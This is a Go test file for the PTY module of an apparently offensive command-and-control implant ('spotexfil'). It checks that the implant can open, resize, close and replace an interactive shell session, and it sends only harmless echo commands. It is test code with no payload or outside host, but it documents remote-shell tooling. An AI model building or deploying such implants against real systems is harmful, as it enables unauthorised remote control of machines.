package c2

import (
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/sourcefrenchy/spotexfil/pkg/protocol"
)

func skipPtyOnWindows(t *testing.T) {
	t.Helper()
	if runtime.GOOS == "windows" {
		t.Skip("skipping pty test on windows: creack/pty ConPTY behaves differently in CI")
	}
}

func newPtyTestImplant(t *testing.T) *Implant {
	t.Helper()
	imp := NewImplantWithOptions(nil, "k", ImplantOptions{Interval: 20, Quiet: true})
	t.Cleanup(func() {
		imp.handlePtyFrame(ptyCmd(PtyFrame{Op: PtyOpClose}))
		// Drain any frames the teardown produced.
		for {
			select {
			case <-imp.resultCh:
			default:
				return
			}
		}
	})
	return imp
}

func ptyCmd(f PtyFrame) *protocol.C2Message {
	msg := protocol.NewC2Message("pty", 1)
	msg.Args = f.toArgs()
	return msg
}

// nextPtyResultFrame pulls the next pty frame from resultCh, decoding
// it from the result Data string.
func nextPtyResultFrame(t *testing.T, imp *Implant, timeout time.Duration) PtyFrame {
	t.Helper()
	deadline := time.After(timeout)
	for {
		select {
		case res := <-imp.resultCh:
			if res.Module != "pty" {
				continue
			}
			f, err := UnmarshalPtyFrame(res.Data)
			if err != nil {
				t.Fatalf("bad pty frame in result: %v", err)
			}
			if res.SessionID != imp.sessionID {
				t.Fatalf("result missing session id: %+v", res)
			}
			return f
		case <-deadline:
			t.Fatal("timed out waiting for pty frame")
			return PtyFrame{}
		}
	}
}

func openPtySession(t *testing.T, imp *Implant) {
	t.Helper()
	imp.handlePtyFrame(ptyCmd(PtyFrame{Op: PtyOpOpen, Cols: 80, Rows: 24}))
	f := nextPtyResultFrame(t, imp, 5*time.Second)
	if f.Op != PtyOpOpenOK {
		t.Fatalf("expected open-ok, got op=%q data=%q", f.Op, f.Data)
	}
}

// echoAndCollect sends a shell command and collects pty output until
// the marker string appears in the decoded payload.
func echoAndCollect(t *testing.T, imp *Implant, cmd, marker string, seq *int) string {
	t.Helper()
	imp.handlePtyFrame(ptyCmd(PtyFrame{
		Op:   PtyOpData,
		Seq:  *seq,
		Data: EncodePtyData([]byte(cmd)),
	}))
	*seq++

	var out strings.Builder
	deadline := time.Now().Add(10 * time.Second)
	for time.Now().Before(deadline) {
		f := nextPtyResultFrame(t, imp, deadline.Sub(time.Now()))
		if f.Op != PtyOpData {
			continue
		}
		b, err := DecodePtyData(f.Data)
		if err != nil {
			t.Fatalf("bad base64 in data frame: %v", err)
		}
		out.Write(b)
		if strings.Contains(out.String(), marker) {
			return out.String()
		}
	}
	t.Fatalf("marker %q not found in pty output: %q", marker, out.String())
	return ""
}

func TestPtyOpenFlow(t *testing.T) {
	skipPtyOnWindows(t)
	imp := newPtyTestImplant(t)
	openPtySession(t, imp)
	if !imp.getPtyManager().sessionAlive() {
		t.Fatal("session not alive after open-ok")
	}
}

func TestPtyEchoFlow(t *testing.T) {
	skipPtyOnWindows(t)
	imp := newPtyTestImplant(t)
	openPtySession(t, imp)

	seq := 0
	out := echoAndCollect(t, imp, "echo ptytest-$?\n", "ptytest-0", &seq)
	if !strings.Contains(out, "ptytest-0") {
		t.Fatalf("unexpected pty output: %q", out)
	}
}

func TestPtyResize(t *testing.T) {
	skipPtyOnWindows(t)
	imp := newPtyTestImplant(t)
	openPtySession(t, imp)

	imp.handlePtyFrame(ptyCmd(PtyFrame{Op: PtyOpResize, Cols: 120, Rows: 40}))
	if !imp.getPtyManager().sessionAlive() {
		t.Fatal("session died after resize")
	}

	seq := 0
	echoAndCollect(t, imp, "echo ptytest-$?\n", "ptytest-0", &seq)
}

func TestPtyClose(t *testing.T) {
	skipPtyOnWindows(t)
	imp := newPtyTestImplant(t)
	openPtySession(t, imp)

	imp.handlePtyFrame(ptyCmd(PtyFrame{Op: PtyOpClose}))
	deadline := time.Now().Add(5 * time.Second)
	for imp.getPtyManager().sessionAlive() && time.Now().Before(deadline) {
		time.Sleep(10 * time.Millisecond)
	}
	if imp.getPtyManager().sessionAlive() {
		t.Fatal("session still alive after close")
	}

	// A data frame after close must be a no-op (no panic, no output).
	imp.handlePtyFrame(ptyCmd(PtyFrame{
		Op:   PtyOpData,
		Seq:  0,
		Data: EncodePtyData([]byte("echo nope\n")),
	}))
	select {
	case res := <-imp.resultCh:
		t.Fatalf("unexpected result after close: %+v", res)
	case <-time.After(300 * time.Millisecond):
	}
}

func TestPtyReplaceSemantics(t *testing.T) {
	skipPtyOnWindows(t)
	imp := newPtyTestImplant(t)
	openPtySession(t, imp)

	// Drain any shell banner output from the first session.
	for {
		select {
		case <-imp.resultCh:
		default:
			goto drained
		}
	}
drained:

	// Second open replaces the first session.
	openPtySession(t, imp)

	// New session works: seq resets, echo succeeds.
	seq := 0
	echoAndCollect(t, imp, "echo ptytest-$?\n", "ptytest-0", &seq)
}

func TestPtyFrameArgsRoundtrip(t *testing.T) {
	orig := PtyFrame{Op: PtyOpData, Cols: 132, Rows: 43, Seq: 7, Data: "aGVsbG8="}
	args := orig.toArgs()

	// Simulate JSON transport: numbers come back as float64.
	jsonish := map[string]interface{}{}
	for k, v := range args {
		if n, ok := v.(int); ok {
			jsonish[k] = float64(n)
		} else {
			jsonish[k] = v
		}
	}

	got := ptyFrameFromArgs(jsonish)
	if got != orig {
		t.Fatalf("roundtrip mismatch: got %+v want %+v", got, orig)
	}
}
